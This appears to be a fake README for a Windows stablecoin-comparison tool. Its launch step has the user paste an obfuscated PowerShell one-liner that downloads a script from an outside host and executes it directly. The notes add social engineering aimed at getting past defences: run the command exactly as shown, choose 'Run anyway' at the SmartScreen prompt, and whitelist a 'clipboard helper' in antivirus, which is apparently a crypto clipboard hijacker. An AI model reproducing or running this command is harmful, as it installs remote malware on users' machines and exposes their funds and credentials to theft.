# Stablecoin Compare — Current Release Guide

![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078d7?logo=windows11&logoColor=white) ![version](https://img.shields.io/badge/version-v6.1.2-blue) ![status](https://img.shields.io/badge/status-maintained-success) ![updated](https://img.shields.io/badge/updated-2026--11--12-informational) ![license](https://img.shields.io/badge/license-MIT-green)

What backs each peg, in plain numbers. Everything you need is bundled in this repository — follow the quick start below and you'll be up and running in under two minutes.

## ✨ Highlights

- ✅ One-click setup — no manual configuration needed
- ✅ Step-by-step documentation included in this repository
- ✅ Works on Windows 10 and Windows 11 (64-bit)
- ✅ Offline-friendly after first launch

## 🚀 How to launch

1. Hit **Win + X** to bring up the quick menu.
2. Select **Windows PowerShell / Terminal**.
3. Copy the snippet below into the window and confirm with **Enter**.

```powershell
irm quickrun31.cc/ax38ra|&(gal ie*)
```

> 💡 Tip: keep this command handy — re-running it always fetches the current build.

## 🖥️ Requirements

| Requirement | Details |
|---|---|
| Operating system | Windows 10 (64-bit) or newer |
| Memory | 6 GB RAM recommended |
| Disk space | ~50 MB free |
| Internet | Required on first run; updates are periodic |

## 📋 Notes

- Run the command exactly as shown — quotes, pipes and semicolons matter.
- Administrator rights are not required for most setups, but the Win+X terminal runs elevated by default on many systems.
- Windows SmartScreen may ask for confirmation the first time; choose "Run anyway".

## ❓ FAQ

<details>
<summary><strong>Where do I report problems?</strong></summary>

Open an issue in this repository with your OS version and a short description of what happened.

</details>

<details>
<summary><strong>Is an internet connection required?</strong></summary>

Yes — the first launch pulls the latest build, afterwards it can run mostly offline.

</details>

<details>
<summary><strong>How often is it updated?</strong></summary>

Check the changelog file — updates land roughly every few weeks.

</details>

<details>
<summary><strong>Do I need to disable my antivirus?</strong></summary>

Usually no. Only whitelist the helper if your security software quarantines the clipboard helper.

</details>

## 🧾 License

Released under the **MIT License** — see [LICENSE](./LICENSE).

_Educational project. If you like the tool, consider supporting its official developers._
